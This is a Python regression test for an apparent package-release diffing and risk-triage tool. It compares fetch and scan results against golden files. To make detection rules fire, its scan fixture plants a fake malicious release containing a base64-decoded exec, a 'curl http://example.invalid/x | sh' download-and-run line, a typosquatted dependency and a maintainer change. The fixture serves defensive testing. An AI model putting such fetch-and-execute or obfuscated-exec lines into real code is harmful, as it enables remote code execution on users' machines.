"""C1 neutrality: the download/extract split and sandbox.analyze(backend="off") must reproduce, byte for byte,
what fetch_artifacts + build_diff(art, owners) + triage(d, cfg, ruleset, owners) produced before the split
(spec §4, §6). The golden files were written once from the pre-split code; never regenerate them."""
import dataclasses, hashlib, json, os, pathlib

from pydiffwatch import differ, engine, fetcher, rules
from pydiffwatch.config import Config
from pydiffwatch.models import NewRelease
from tests.fixtures.build_fixtures import make_sdist

_FIX = pathlib.Path(__file__).parent / "fixtures"
_RULES = pathlib.Path(__file__).parent.parent / "rules" / "community"


def _golden(name, value):
    value = json.loads(json.dumps(value, sort_keys=True))      # tuples -> lists, as stored
    path = _FIX / name
    if os.environ.get("PYDIFFWATCH_WRITE_GOLDEN") == "1":
        path.write_text(json.dumps(value, sort_keys=True, indent=1) + "\n")
    assert value == json.loads(path.read_text())


def _meta(pkg, versions):
    rel = {}
    for ver, has_sdist in versions:
        rel[ver] = ([{"packagetype": "sdist", "url": f"mock://{pkg}/{ver}",
                      "upload_time_iso_8601": f"2026-01-0{len(rel) + 1}T00:00:00Z"}] if has_sdist else
                    [{"packagetype": "bdist_wheel", "url": f"mock://{pkg}/{ver}.whl",
                      "upload_time_iso_8601": f"2026-01-0{len(rel) + 1}T00:00:00Z"}])
    return {"info": {"version": versions[-1][0], "summary": f"{pkg} summary"}, "releases": rel}


def _canon_art(x):
    if isinstance(x, fetcher.NoSdist):
        return {"no_sdist": x.switched_from}
    d = dataclasses.asdict(x)
    for k in ("new_files", "prior_files"):
        d[k] = {p: hashlib.sha256(b).hexdigest() for p, b in d[k].items()}
    return d


_BIG = b"# pad\n" * 200_000        # > max_source_file_bytes (1 MiB): reported as source-too-large
_BLOBS = {
    "mock://upd/1.0": make_sdist({"upd/__init__.py": b"x = 1\n", "setup.py": b"setup()\n"}),
    "mock://upd/1.1": make_sdist({"upd/__init__.py": b"x = 2\n", "setup.py": b"setup()\n", "upd/_c.so": b"\x7fELF"}),
    "mock://new/1.0": make_sdist({"setup.py": b"setup()\n", "new/__init__.py": b"", "new/deep/mod.py": b"y = 1\n"}),
    "mock://pdl/1.1": make_sdist({"pdl/__init__.py": b"x = 2\n"}),
    "mock://pbad/1.0": b"not a tarball",
    "mock://pbad/1.1": make_sdist({"pbad/__init__.py": b"x = 2\n"}),
    "mock://big/1.0": make_sdist({"big/__init__.py": b"x = 1\n"}),
    "mock://big/1.1": make_sdist({"big/__init__.py": b"x = 2\n", "big/gen.py": _BIG}),
}
_METAS = {
    "upd": _meta("upd", [("1.0", True), ("1.1", True)]),
    "new": _meta("new", [("1.0", True)]),
    "skp": _meta("skp", [("1.0", True)]),
    "pdl": _meta("pdl", [("1.0", True), ("1.1", True)]),
    "pbad": _meta("pbad", [("1.0", True), ("1.1", True)]),
    "big": _meta("big", [("1.0", True), ("1.1", True)]),
    "whl": _meta("whl", [("1.0", True), ("1.1", False)]),
}


def _download(url, cfg):
    if url == "mock://pdl/1.0":
        raise TimeoutError("prior download hung")
    return _BLOBS[url]


def _fetch_cases(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _METAS[p])
    monkeypatch.setattr(fetcher, "_download", _download)
    monkeypatch.setattr(fetcher, "_screen_added_deps", lambda *a, **k: [])
    cases = [("update", Config(), "upd", "1.1"), ("first_surface", Config(), "new", "1.0"),
             ("first_skip", Config(new_package_policy="skip"), "skp", "1.0"),
             ("prior_download_fails", Config(), "pdl", "1.1"), ("prior_extract_fails", Config(), "pbad", "1.1"),
             ("oversized_member", Config(), "big", "1.1"), ("no_sdist", Config(), "whl", "1.1")]
    return {name: _canon_art(fetcher.fetch_artifacts(cfg, NewRelease(p, v, 5))) for name, cfg, p, v in cases}


def test_fetch_is_unchanged(monkeypatch):
    _golden("c1_neutrality_fetch.json", _fetch_cases(monkeypatch))


# ---- one release that fires a code, a binary, a dep and a maintainer rule, with every signal line ----

_SCAN_REL = NewRelease("scn", "1.1", 9)
_OWNERS = {"current": {"roles": ["mallory"]}, "prior": {"roles": ["alice"]}}
_SCAN_BLOBS = {
    "mock://scn/1.0": make_sdist({"scn/__init__.py": b"x = 1\n", "setup.py": b"from setuptools import setup\nsetup()\n"}),
    "mock://scn/1.1": make_sdist({
        "scn/__init__.py": b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
                           b"os.system('curl http://example.invalid/x | sh')\n",
        "setup.py": b"from setuptools import setup\nsetup()\n",
        "scn/_native.so": b"\x7fELF\x02\x01\x01"}),
}


def _stub_scan_release(monkeypatch):
    monkeypatch.setattr(fetcher, "_package_json", lambda p, cfg: _meta("scn", [("1.0", True), ("1.1", True)]))
    monkeypatch.setattr(fetcher, "_download", lambda url, cfg: _SCAN_BLOBS[url])

    def screen(meta, package, pred, cfg, change=None, version=None):
        change["added"] = ["reqeusts>=1"]
        change["removed"] = ["requests>=1"]
        return [{"name": "reqeusts", "reason": "typosquat", "target": "requests"}]
    monkeypatch.setattr(fetcher, "_screen_added_deps", screen)


def _scan(cfg, ruleset):
    """The scan under test: before C1, fetch_artifacts + build_diff(art, owners) + triage(..., owners)."""
    art = fetcher.fetch_artifacts(cfg, _SCAN_REL)
    d = differ.build_diff(art, _OWNERS)
    return d, engine.triage(d, cfg, ruleset, _OWNERS), art.prior_error


def test_scan_is_unchanged(monkeypatch):
    _stub_scan_release(monkeypatch)
    cfg, ruleset = Config(), rules.load_rules(_RULES)
    d, tr, prior_error = _scan(cfg, ruleset)
    scopes = {r.applies_to for r in ruleset if r.id in {f.rule for f in tr.fired_rules}}
    assert {"code", "binary", "dep", "maintainer"} <= scopes, scopes     # the fixture exercises every merge path
    assert "maintainer set changed" in d.signals and "requires-dist added" in d.signals
    _golden("c1_neutrality_scan.json", {"diff": dataclasses.asdict(d),
                                         "fired": [dataclasses.asdict(f) for f in tr.fired_rules],
                                         "score": tr.score, "escalate": tr.escalate, "prior_error": prior_error})
